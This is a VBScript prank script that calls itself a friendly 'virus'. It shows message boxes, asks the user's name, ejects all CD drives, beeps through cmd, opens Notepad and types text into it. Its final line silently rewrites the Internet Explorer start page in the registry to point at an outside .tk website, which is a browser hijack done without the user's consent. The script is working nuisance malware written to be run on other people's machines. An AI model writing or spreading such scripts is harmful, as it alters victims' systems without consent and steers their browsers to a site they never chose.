msgbox "I'm a virus..."
msgbox "Did you know that?"
msgbox "You better read my instructions, cause if you don't it might cause serious damage to your PC"
msgbox "And i don't want to do that to your nice pc..."
msgbox "For the people who don't belive that i am a true hacker, i will show you something"
msgbox "if you got something for your CD drive, you better remove it..."
msgbox "well here it comes:"
Set oWMP = CreateObject("WMPlayer.OCX.7" )
Set colCDROMs = oWMP.cdromCollection
if colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next ' cdrom
End If
msgbox "you see"
msgbox "Well, let's have a converstion"
a=inputbox("what's your name...")
msgbox "So your name is"+a
msgbox "Nice name..."
msgbox "My name is Virus..."
msgbox "But i'm friendly :)"
msgbox "Well i will go now..."
msgbox "Bye!!!"
Set oWS = WScript.CreateObject("WScript.Shell")
oWS.Run "%comspec% /c echo " & Chr(07), 0, True
msgbox "Oops i did something wrong..."
msgbox "I will try it again..."
Set oWS = WScript.CreateObject("WScript.Shell")
oWS.Run "%comspec% /c echo " & Chr(07), 0, True
Set WshShell = WScript.CreateObject ("WScript.Shell")
WshShell.Run ("notepad.exe")
WScript.Sleep 100
WshShell.SendKeys "Now i am in your Wordpad..."
Set shl = CreateObject("Wscript.shell")
Shl.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.dutchgamingcenter.tk"